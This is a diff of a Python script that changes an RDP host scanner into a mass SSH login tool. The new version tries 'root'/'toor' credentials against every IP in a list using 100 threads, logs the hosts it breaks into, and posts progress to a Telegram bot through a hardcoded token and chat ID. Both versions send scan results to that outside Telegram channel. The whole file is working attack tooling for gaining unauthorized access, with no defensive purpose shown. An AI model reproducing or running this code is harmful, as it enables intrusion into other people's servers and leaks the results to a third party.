@@ -1,85 +1,66 @@
-import time
+import paramiko
+import socket
 import threading
-import requests
-import subprocess
-import os
 from concurrent.futures import ThreadPoolExecutor
+import time
+import requests
 
 INPUT_FILE = 'ip.txt'
-OUTPUT_FILE = 'live_rdp_verified.txt'
+OUTPUT_FILE = 'live_ssh_verified.txt'
+USERNAME = 'root'
+PASSWORD = 'toor'
 BOT_TOKEN = '7691507387:AAEl81yaGi3Te1KOqOtBqPahu_fjzXljQs4'
 CHAT_ID = '5326706151'
 
+live_count = 0
+bad_count = 0
 lock = threading.Lock()
-total_ips = 0
-scanned = 0
-good = 0
-bad = 0
 
-def is_windows_rdp(ip):
+def is_ssh_accessible(ip):
+    global live_count, bad_count
     try:
-        result = subprocess.run(
-            ['nmap', '-p', '3389', '--script', 'rdp-ntlm-info', '-Pn', ip],
-            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=15
-        )
-        output = result.stdout.decode()
-        return "Product: Windows" in output
+        sock = socket.socket()
+        sock.settimeout(3)
+        sock.connect((ip, 22))
+        sock.close()
     except:
-        return False
-
-def check_and_save(ip):
-    global scanned, good, bad
-    os.system(f'echo "[SCAN] {ip} - checking if Windows RDP..."')
-    if is_windows_rdp(ip):
-        os.system(f'echo "[WIN-RDP] {ip}"')
         with lock:
-            with open(OUTPUT_FILE, 'a+') as f:
-                f.seek(0)
-                if ip not in f.read():
-                    f.write(ip + '\n')
-            good += 1
-    else:
-        os.system(f'echo "[NOT Windows] {ip}"')
-        with lock:
-            bad += 1
-    with lock:
-        scanned += 1
+            bad_count += 1
+        return
 
-def send_status_update():
-    while True:
-        time.sleep(120)
-        with lock:
-            message = f"SCANNED: {scanned}\nGOOD: {good}\nBAD: {bad}\nTOTAL: {total_ips}"
-        requests.post(
-            f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
-            data={'chat_id': CHAT_ID, 'text': message}
-        )
-
-def send_file_to_telegram():
-    time.sleep(3 * 3600 + 15 * 60)
-    os.system('echo "[!] 3h15m reached. Sending file to Telegram..."')
     try:
-        with open(OUTPUT_FILE, 'rb') as file:
-            requests.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
-                data={'chat_id': CHAT_ID},
-                files={'document': file}
-            )
-        os.system('echo "[+] File sent to Telegram."')
-    except Exception as e:
-        os.system(f'echo "[!] Failed to send file: {e}"')
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(ip, port=22, username=USERNAME, password=PASSWORD, timeout=5)
+        with lock:
+            live_count += 1
+            print(f"[+] SSH FOUND: {ip}")
+            with open(OUTPUT_FILE, 'a') as f:
+                f.write(f"{ip}\n")
+        ssh.close()
+    except:
+        with lock:
+            bad_count += 1
+
+def send_telegram_update():
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    while True:
+        time.sleep(120)  # Every 2 minutes
+        total = live_count + bad_count
+        message = f"SCANNED: {total}\nGOOD: {live_count}\nBAD: {bad_count}\nTOTAL: {total}"
+        try:
+            requests.post(url, data={'chat_id': CHAT_ID, 'text': message})
+            print("[Update] Sent to Telegram.")
+        except Exception as e:
+            print(f"[Error] Telegram send failed: {e}")
 
 def main():
-    global total_ips
-    threading.Thread(target=send_file_to_telegram, daemon=True).start()
-    threading.Thread(target=send_status_update, daemon=True).start()
-
+    threading.Thread(target=send_telegram_update, daemon=True).start()
     with open(INPUT_FILE, 'r') as f:
         ips = [line.strip() for line in f if line.strip()]
-    total_ips = len(ips)
 
     with ThreadPoolExecutor(max_workers=100) as executor:
-        executor.map(check_and_save, ips)
+        executor.map(is_ssh_accessible, ips)
 
 if __name__ == '__main__':
     main()
